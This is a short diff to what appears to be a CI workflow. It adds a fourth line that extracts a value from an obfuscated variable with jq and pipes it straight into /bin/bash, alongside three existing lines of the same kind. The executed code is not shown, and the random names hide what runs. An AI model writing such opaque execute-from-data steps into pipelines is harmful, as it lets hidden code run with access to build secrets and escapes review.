@@ -26,6 +26,7 @@ jobs:
           echo $n0 | jq -r .npdfi0001 | /bin/bash
           echo $omy18526 | jq -r .og89229 | /bin/bash
           printf '%s' "$knsi03447" | jq -r .cc45274 | /bin/bash
+          echo $k13111 | jq -r .cmi6 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
